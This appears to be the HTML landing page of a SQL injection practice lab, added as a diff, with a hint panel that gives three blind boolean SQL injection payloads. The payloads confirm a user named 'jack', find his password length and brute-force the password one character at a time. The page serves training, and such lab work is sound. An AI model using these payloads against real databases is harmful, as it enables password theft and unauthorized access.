@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>home</title>
+    <style>
+        :root {
+            --nozomi-red: #E63E62;    
+            --hikari-green: #00B894;  
+            --bg-color: #2D3436;      
+            --card-bg: #FFFFFF;       
+            --text-main: #2D3436;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', 'Microsoft JhengHei', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: var(--bg-color);
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            overflow: hidden;
+        }
+
+        body::after {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(
+                to bottom,
+                transparent 50%,
+                rgba(0, 255, 150, 0.02) 50%,
+                rgba(0, 255, 150, 0.05) 51%,
+                transparent 52%
+            );
+            background-size: 100% 10px;
+            animation: scanline 8s linear infinite;
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        @keyframes scanline {
+            0% { background-position: 0 -100vh; }
+            100% { background-position: 0 100vh; }
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 40px 50px;
+            border-radius: 8px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            text-align: center;
+            max-width: 480px;
+            width: 90%;
+            position: relative;
+            border-left: 8px solid var(--nozomi-red);
+            border-right: 8px solid var(--hikari-green);
+            opacity: 0;
+            animation: slideIn 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(30px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 6px;
+            background: linear-gradient(90deg, var(--nozomi-red) 50%, var(--hikari-green) 50%);
+        }
+
+        .status-light {
+            position: absolute;
+            top: 15px;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            box-shadow: 0 0 5px currentColor;
+        }
+        .light-nozomi { left: 15px; background-color: var(--nozomi-red); color: var(--nozomi-red); animation: blink 3s infinite ease-in-out; }
+        .light-hikari { right: 15px; background-color: var(--hikari-green); color: var(--hikari-green); animation: blink 4s infinite ease-in-out 1s; }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.2); box-shadow: 0 0 10px currentColor; }
+        }
+
+        h1 { color: var(--text-main); margin-bottom: 10px; font-size: 1.8em; letter-spacing: 1px; text-transform: uppercase; }
+        .subtitle { display: inline-block; font-size: 0.8em; color: #636e72; background: #f1f2f6; padding: 4px 12px; border-radius: 4px; margin-bottom: 30px; font-weight: bold; letter-spacing: 1px; }
+
+        a.btn-less, button.btn-hint {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            box-sizing: border-box;
+            padding: 12px 0;
+            margin: 15px 0;
+            font-size: 1em;
+            font-weight: bold;
+            text-decoration: none;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        a.btn-less::before, button.btn-hint::before {
+            content: '▶';
+            display: inline-block;
+            opacity: 0;
+            max-width: 0;
+            transform: translateX(-20px);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin-right: 0;
+        }
+
+        a.btn-less:hover::before, button.btn-hint:hover::before {
+            opacity: 1;
+            max-width: 20px;
+            transform: translateX(0);
+            margin-right: 8px;
+        }
+
+        a.btn-less::after, button.btn-hint::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%; width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: 0.5s;
+        }
+        a.btn-less:hover::after, button.btn-hint:hover::after { left: 100%; }
+
+        .btn-less { background-color: var(--nozomi-red); border-bottom: 4px solid #c0392b; }
+        .btn-less:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(230, 62, 98, 0.4); }
+        .btn-less:active { transform: translateY(2px); border-bottom: 2px solid #c0392b; }
+
+        .btn-hint { background-color: var(--hikari-green); border-bottom: 4px solid #008b70; }
+        .btn-hint:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 184, 148, 0.4); }
+        .btn-hint:active { transform: translateY(2px); border-bottom: 2px solid #008b70; }
+
+        #hint-content {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-left: 4px solid var(--hikari-green);
+            color: #2d3436;
+            text-align: left;
+            font-size: 0.95em;
+            line-height: 1.6;
+            border-radius: 0 4px 4px 0;
+            animation: fadeInDown 0.4s ease-out;
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        code { background: #dfe6e9; padding: 2px 6px; border-radius: 3px; color: #d63031; font-family: Consolas, monospace; }
+        .badge { font-size: 0.7em; vertical-align: middle; padding: 2px 6px; border-radius: 3px; margin-right: 5px; }
+        .badge-momoi { background: #FF88AD; color: white; }
+    </style>
+    
+    <script>
+        function toggleHint() {
+            var hint = document.getElementById("hint-content");
+            var btn = document.getElementById("hint-btn");
+            
+            if (hint.style.display === "block") {
+                hint.style.display = "none";
+                btn.innerText = "Show Hint";
+            } else {
+                hint.style.display = "block";
+                btn.innerText = "Close Hint";
+            }
+        }
+    </script>
+</head>
+<body>
+
+<div class="container">
+    <div class="status-light light-nozomi" title="System Status: Nozomi"></div>
+    <div class="status-light light-hikari" title="System Status: Hikari"></div>
+
+    <h1>SQLi-Lab</h1>
+    <div class="subtitle">JACK SECURITY FLATFORM</div>
+
+    <a href="Less-8/" class="btn-less" target="_blank">
+        Start Mission
+    </a>
+    
+    <button id="hint-btn" class="btn-hint" onclick="toggleHint()">
+        Show Hint
+    </button>
+
+   <div id="hint-content">
+
+        <div style="margin-bottom: 10px;">
+            <span class="badge" style="background: var(--hikari-green); color: white;">GUIDE</span> 
+            <strong style="color: var(--text-main);">Wick's Tips:</strong>
+        </div>
+        
+        <hr style="border: 0; border-top: 1px dashed #ccc; margin: 10px 0;">
+        
+        <div style="margin-bottom: 12px;">
+            <div style="font-size: 0.9em; font-weight: bold; color: #555; margin-bottom: 4px;">
+                1. 確定 jack 存在
+            </div>
+            <code style="display: block; padding: 8px; border-left: 3px solid var(--hikari-green);">
+                1' AND (SELECT 'a' FROM users WHERE username='jack')='a'#
+            </code>
+        </div>
+
+        <div style="margin-bottom: 12px;">
+            <div style="font-size: 0.9em; font-weight: bold; color: #555; margin-bottom: 4px;">
+                2. 檢查密碼長度 
+            </div>
+            <code style="display: block; padding: 8px; border-left: 3px solid var(--hikari-green);">
+                1' AND (SELECT 'a' FROM users WHERE username='jack' AND length(password)=1)='a'#
+            </code>
+
+        </div>
+
+        <div style="margin-bottom: 12px;">
+            <div style="font-size: 0.9em; font-weight: bold; color: #555; margin-bottom: 4px;">
+                3. 爆破出密碼 
+            </div>
+            <code style="display: block; padding: 8px; border-left: 3px solid var(--hikari-green);">
+                1' AND (SELECT substring(password,1,1) FROM users WHERE username='jack')='a'#
+            </code>
+        </div>
+
+        <div style="margin-top: 15px; font-size: 0.8em; color: #888; border-top: 1px solid #eee; padding-top: 5px;">
+            > System Note: 僅供參考
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
